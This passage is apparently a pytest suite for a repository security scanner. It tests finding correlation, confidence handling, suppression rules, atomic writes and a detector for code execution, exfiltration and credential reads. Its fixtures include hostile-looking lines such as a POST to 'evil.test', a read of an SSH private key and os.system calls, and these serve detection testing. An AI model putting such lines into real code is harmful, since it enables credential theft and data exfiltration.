        assert not any("CI Runner Memory" in c.title for c in correlated)

    def test_different_files_no_correlation(self):
        """proc/mem in one file, enumeration in another -> no correlation (per-file rule)."""
        findings = [
            core.Finding("sast", "critical", "Process Memory Read (/proc)",
                "memory-forensics /proc/1234/mem", "reader.py", 5, "", "memory-forensics"),
            core.Finding("sast", "high", "Process Enumeration (/proc)",
                "process-enumeration listing", "scanner.py", 3, "", "process-enumeration"),
        ]
        correlated = core.correlate(findings)
        assert not any("CI Runner Memory" in c.title for c in correlated)


class TestTagsPrecomputation:
    """Verify _tags caching and that correlation results are identical before/after."""

    def test_tags_populated_on_finding(self):
        f = core.Finding("sast", "high", "My Title", "my description", "a.py", 1, "", "my-category")
        assert hasattr(f, "_tags")
        assert "my title" in f._tags
        assert "my description" in f._tags
        assert "my-category" in f._tags

    def test_tags_lowercase(self):
        f = core.Finding("s", "low", "UPPER", "MIXED Case", "f.py", 0, "", "CAT")
        assert f._tags == f._tags.lower()

    def test_tags_none_fields_dont_crash(self):
        f = core.Finding("s", "low", None, None, "f.py", 0, "", None)
        assert isinstance(f._tags, str)

    def test_correlation_identical_with_tags(self):
        """Correlation results match between a plain Finding list and a re-run
        to confirm _tags doesn't change behavior."""
        findings = [
            core.Finding("secrets", "high", "Env Access", "environ access", "app.py", 1, "", "env access"),
            core.Finding("sast", "high", "HTTP POST", "network post request", "app.py", 5, "", "network"),
            core.Finding("entropy", "high", "Base64", "base64 encoding", "evil.py", 1, "", "encoding"),
            core.Finding("sast", "critical", "eval()", "eval code execution", "evil.py", 3, "", "exec"),
        ]
        first_run = {c.title for c in core.correlate(findings)}
        second_run = {c.title for c in core.correlate(findings)}
        assert first_run == second_run
        assert "Potential Data Exfiltration" in first_run
        assert "Obfuscated Code Execution" in first_run

    def test_findings_from_dicts_iter_lazy(self):
        """findings_from_dicts_iter yields the same findings as findings_from_dicts."""
        dicts = [
            {"scanner": "sast", "severity": "high", "title": "T1", "description": "d1",
             "file": "a.py", "line": 1, "snippet": "", "category": "c1"},
            {"scanner": "secrets", "severity": "low", "title": "T2", "description": "d2",
             "file": "b.py", "line": 2, "snippet": "", "category": "c2"},
            "not-a-dict",
        ]
        eager = core.findings_from_dicts(dicts)
        lazy = list(core.findings_from_dicts_iter(dicts))

        assert len(lazy) == len(eager)
        for e, lz in zip(eager, lazy):
            assert e.title == lz.title
            assert e.file == lz.file
            assert e._tags == lz._tags

    def test_run_correlation_pass_via_iter(self):
        """run_correlation_pass produces the same correlated titles via lazy streaming."""
        import sys
        import os
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))
        import aggregate_json as agg

        dicts = [
            {"scanner": "secrets", "severity": "high", "title": "Env Access",
             "description": "environ access", "file": "app.py", "line": 1, "snippet": "", "category": "env access"},
            {"scanner": "sast", "severity": "high", "title": "HTTP POST",
             "description": "network post request", "file": "app.py", "line": 5, "snippet": "", "category": "network"},
        ]
        correlated = agg.run_correlation_pass(dicts)
        titles = [c["title"] for c in correlated]
        assert "Potential Data Exfiltration" in titles


class TestFindingConfidence:
    """U1: confidence dimension + rule_id on Finding."""

    def test_confidence_defaults_from_severity(self):
        for sev, expected in [
            ("critical", 0.95), ("high", 0.80), ("medium", 0.60), ("low", 0.40)
        ]:
            f = core.Finding("s", sev, "t", "d", "f", 0, "", "c")
            assert f.confidence == expected

    def test_unknown_severity_confidence_fallback(self):
        f = core.Finding("s", "bogus", "t", "d", "f", 0, "", "c")
        assert f.confidence == 0.40

    def test_explicit_confidence_preserved(self):
        f = core.Finding("s", "low", "t", "d", "f", 0, "", "c", confidence=0.73)
        assert f.confidence == 0.73

    def test_confidence_clamped_above_one(self):
        f = core.Finding("s", "low", "t", "d", "f", 0, "", "c", confidence=1.5)
        assert f.confidence == 1.0

    def test_confidence_clamped_below_zero(self):
        f = core.Finding("s", "low", "t", "d", "f", 0, "", "c", confidence=-0.5)
        assert f.confidence == 0.0

    def test_none_confidence_falls_back_to_severity(self):
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c", confidence=None)
        assert f.confidence == 0.80

    def test_non_numeric_confidence_falls_back(self):
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c", confidence="oops")
        assert f.confidence == 0.80

    # --- C4: NaN / ±inf / string / None confidence coercion (Finding side) ---

    def test_c4_nan_confidence_coerced(self):
        """C4: NaN confidence must NOT survive __post_init__; NaN compares False
        to all numeric tests so the old < / > clamp was bypassed."""
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c",
                         confidence=float("nan"))
        assert math.isfinite(f.confidence), (
            f"NaN survived __post_init__: {f.confidence}"
        )
        assert 0.0 <= f.confidence <= 1.0

    def test_c4_pos_inf_confidence_coerced(self):
        f = core.Finding("s", "medium", "t", "d", "f", 0, "", "c",
                         confidence=float("inf"))
        assert math.isfinite(f.confidence)
        assert 0.0 <= f.confidence <= 1.0

    def test_c4_neg_inf_confidence_coerced(self):
        f = core.Finding("s", "low", "t", "d", "f", 0, "", "c",
                         confidence=float("-inf"))
        assert math.isfinite(f.confidence)
        assert 0.0 <= f.confidence <= 1.0

    def test_c4_string_confidence_falls_back(self):
        """C4: a string like 'high' must fall back to severity-derived default."""
        f = core.Finding("s", "critical", "t", "d", "f", 0, "", "c",
                         confidence="high")
        assert math.isfinite(f.confidence)
        assert f.confidence == 0.95  # severity-derived fallback for "critical"

    def test_c4_nan_confidence_produces_valid_json(self):
        """C4: a Finding built with NaN confidence must serialise to valid JSON
        (no non-standard NaN literal that breaks strict JSON consumers)."""
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c",
                         confidence=float("nan"))
        serialised = json.dumps(f.to_dict())   # must not raise
        parsed = json.loads(serialised)        # must round-trip
        assert math.isfinite(parsed["confidence"])
        assert 0.0 <= parsed["confidence"] <= 1.0

    def test_rule_id_default_empty(self):
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c")
        assert f.rule_id == ""

    def test_rule_id_preserved(self):
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c", rule_id="ST-PI-001")
        assert f.rule_id == "ST-PI-001"

    def test_to_dict_includes_new_keys_excludes_tags(self):
        f = core.Finding("s", "high", "t", "d", "f", 0, "", "c", rule_id="X-Y-1")
        d = f.to_dict()
        assert d["rule_id"] == "X-Y-1"
        assert "confidence" in d
        assert d["confidence"] == 0.80
        assert "_tags" not in d


class TestRuleSuppressionParsing:
    """U1: .forensicsignore rule: line parsing + match semantics."""

    def _write_ignore(self, tmp_path, content):
        (tmp_path / ".forensicsignore").write_text(content)

    def test_rule_line_excluded_from_path_patterns(self, tmp_path):
        self._write_ignore(tmp_path, "node_modules/\nrule:SC-KEY-001\n")
        patterns = core.load_ignore_patterns(str(tmp_path))
        assert "node_modules/" in patterns
        assert all(not p.startswith("rule:") for p in patterns)

    def test_parse_rule_without_glob(self, tmp_path):
        self._write_ignore(tmp_path, "rule:SC-KEY-001\n")
        supps = core.load_rule_suppressions(str(tmp_path))
        assert len(supps) == 1
        assert supps[0]["rule_id"] == "SC-KEY-001"
        assert supps[0]["glob"] is None

    def test_parse_rule_with_glob(self, tmp_path):
        self._write_ignore(tmp_path, "rule:SC-KEY-001:tests/**\n")
        supps = core.load_rule_suppressions(str(tmp_path))
        assert supps[0]["rule_id"] == "SC-KEY-001"
        assert supps[0]["glob"] == "tests/**"

    def test_malformed_empty_id_skipped(self, tmp_path):
        self._write_ignore(tmp_path, "rule:\nrule::tests/**\n")
        supps = core.load_rule_suppressions(str(tmp_path))
        assert supps == []

    def test_suppression_matches_id_only(self):
        supp = {"rule_id": "SC-KEY-001", "glob": None}
        assert core.suppression_matches(supp, "SC-KEY-001", "anywhere/x.py")
        assert not core.suppression_matches(supp, "OTHER-001", "anywhere/x.py")

    def test_suppression_matches_with_glob(self):
        supp = {"rule_id": "SC-KEY-001", "glob": "tests/**"}
        assert core.suppression_matches(supp, "SC-KEY-001", "tests/a/b.py")
        assert not core.suppression_matches(supp, "SC-KEY-001", "src/b.py")

    def test_suppression_no_match_when_rule_id_empty(self):
        supp = {"rule_id": "SC-KEY-001", "glob": None}
        assert not core.suppression_matches(supp, "", "tests/x.py")


class TestAtomicWrite:
    """Cross-platform hardening of the shared atomic-write engine."""

    def test_json_round_trip(self, tmp_path):
        p = str(tmp_path / "x.json")
        core.atomic_write_json(p, {"a": 1, "b": [2, 3]})
        with open(p, encoding="utf-8") as f:
            assert json.load(f) == {"a": 1, "b": [2, 3]}

    def test_text_round_trip(self, tmp_path):
        p = str(tmp_path / "x.txt")
        core.atomic_write_text(p, "hello\nworld\n")
        with open(p, encoding="utf-8") as f:
            assert f.read() == "hello\nworld\n"

    def test_newline_not_translated(self, tmp_path):
        """newline='' must keep \\n exactly as written (no CRLF rewrite), so a
        byte-exact / signature-verified payload survives even on Windows."""
        p = str(tmp_path / "exact.bin")
        core.atomic_write_text(p, "a\nb\nc\n")
        with open(p, "rb") as f:
            assert f.read() == b"a\nb\nc\n"  # never b"a\r\nb\r\nc\r\n"

    def test_succeeds_without_os_fchmod(self, tmp_path, monkeypatch):
        """Simulate Windows (no os.fchmod): the write must still succeed, not
        crash with AttributeError escaping to the outer handler."""
        import forensics_core as fc
        real_os = fc.os
        monkeypatch.delattr(real_os, "fchmod", raising=False)
        p = str(tmp_path / "winsafe.json")
        core.atomic_write_json(p, {"ok": True})
        with open(p, encoding="utf-8") as f:
            assert json.load(f) == {"ok": True}

    def test_no_fd_leak_on_fdopen_failure(self, tmp_path, monkeypatch):
        """If fdopen raises (e.g. EMFILE), the raw fd must be closed and the
        temp file unlinked — no leaked descriptor, no stray temp."""
        import forensics_core as fc

        opened = {}
        real_open = fc.os.open
        real_close = fc.os.close
        closed = []

        def tracking_open(path, flags, *a, **k):
            fd = real_open(path, flags, *a, **k)
            opened["fd"] = fd
            return fd

        def tracking_close(fd):
            closed.append(fd)
            return real_close(fd)

        def boom_fdopen(*a, **k):
            raise OSError(24, "Too many open files")

        monkeypatch.setattr(fc.os, "open", tracking_open)
        monkeypatch.setattr(fc.os, "close", tracking_close)
        monkeypatch.setattr(fc.os, "fdopen", boom_fdopen)

        p = str(tmp_path / "leak.json")
        with pytest.raises(OSError):
            core.atomic_write_json(p, {"x": 1})
        # The fd we opened got explicitly closed (not leaked to fdopen).
        assert opened["fd"] in closed
        # No final file and no stray temp left behind.
        assert not os.path.exists(p)
        assert list(tmp_path.glob("*.tmp.*")) == []


class TestWalkAux:
    """U0: walk_aux — the cap-free / __pycache__-reaching traversal the
    oversize, bytecode, and archive scanners share (KTD1)."""

    def _rels(self, repo):
        return {rel for _fp, rel in core.walk_aux(str(repo))}

    def test_yields_files_over_size_cap(self, tmp_path):
        # A 12 MB file that walk_repo skips at the line-388 cap must be yielded.
        big = tmp_path / "padded.bin"
        big.write_bytes(b"A" * (12 * 1024 * 1024))
        rels = self._rels(tmp_path)
        assert "padded.bin" in rels

    def test_walk_repo_still_skips_over_size_cap(self, tmp_path):
        # Regression guard: the shared default is unchanged.
        big = tmp_path / "padded.bin"
        big.write_bytes(b"A" * (12 * 1024 * 1024))
        rels = {rel for _fp, rel in core.walk_repo(str(tmp_path), skip_binary=False)}
        assert "padded.bin" not in rels

    def test_apply_size_cap_true_skips_over_cap(self, tmp_path):
        big = tmp_path / "padded.bin"
        big.write_bytes(b"A" * (12 * 1024 * 1024))
        small = tmp_path / "small.txt"
        small.write_text("hello")
        rels = {rel for _fp, rel in core.walk_aux(str(tmp_path), apply_size_cap=True)}
        assert "padded.bin" not in rels
        assert "small.txt" in rels

    def test_reaches_pycache_when_requested(self, tmp_path):
        pyc_dir = tmp_path / "__pycache__"
        pyc_dir.mkdir()
        (pyc_dir / "mod.cpython-314.pyc").write_bytes(b"\x00\x01\x02\x03")
        with_reach = {rel for _fp, rel in core.walk_aux(str(tmp_path), reach_pycache=True)}
        without = {rel for _fp, rel in core.walk_aux(str(tmp_path), reach_pycache=False)}
        assert any("mod.cpython-314.pyc" in r for r in with_reach)
        assert not any("__pycache__" in r for r in without)

    def test_yields_binary_extensions(self, tmp_path):
        # walk_aux never applies the BINARY_EXTENSIONS skip (callers inspect bytes).
        z = tmp_path / "bundle.zip"
        z.write_bytes(b"PK\x03\x04rest")
        rels = self._rels(tmp_path)
        assert "bundle.zip" in rels

    def test_refuses_symlinks(self, tmp_path):
        target = tmp_path / "real.txt"
        target.write_text("x")
        link = tmp_path / "link.txt"
        try:
            os.symlink(target, link)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        rels = self._rels(tmp_path)
        assert "real.txt" in rels
        assert "link.txt" not in rels

    def test_honours_ignore_dirs(self, tmp_path):
        (tmp_path / "node_modules").mkdir()
        (tmp_path / "node_modules" / "junk.js").write_text("x")
        (tmp_path / "keep.js").write_text("x")
        rels = self._rels(tmp_path)
        assert "keep.js" in rels
        assert not any("node_modules" in r for r in rels)


class TestScanTextTrifecta:
    """U0: scan_text_trifecta — trifecta primitives over an in-memory blob."""

    def test_matches_exec_primitive_individually(self):
        findings = core.scan_text_trifecta("x = 1\nos.system('id')\n", "blob.txt")
        cats = {f.category for f in findings}
        assert "code-execution" in cats
        # Individual emission: a single primitive surfaces (unlike detect_trifecta_raw).
        assert len(findings) == 1

    def test_all_three_primitives(self):
        text = (
            "subprocess.run(['sh'])\n"
            "requests.post('http://evil.test', data=x)\n"
            "open('/home/u/.ssh/id_rsa')\n"
        )
        findings = core.scan_text_trifecta(text, "blob.txt")
        cats = {f.category for f in findings}
        assert cats == {"code-execution", "exfiltration", "credential-read"}

    def test_skips_comment_lines(self):
        findings = core.scan_text_trifecta("# os.system('id')\n", "blob.txt")
        assert findings == []

    def test_benign_text_no_findings(self):
        findings = core.scan_text_trifecta("def add(a, b):\n    return a + b\n", "blob.txt")
        assert findings == []

    def test_line_attribution(self):
        findings = core.scan_text_trifecta("line1\nline2\nos.system('id')\n", "blob.txt")
        assert findings[0].line == 3

    def test_first_match_per_primitive_only(self):
        text = "os.system('a')\nos.system('b')\n"
        findings = core.scan_text_trifecta(text, "blob.txt")
        assert len(findings) == 1
        assert findings[0].line == 1
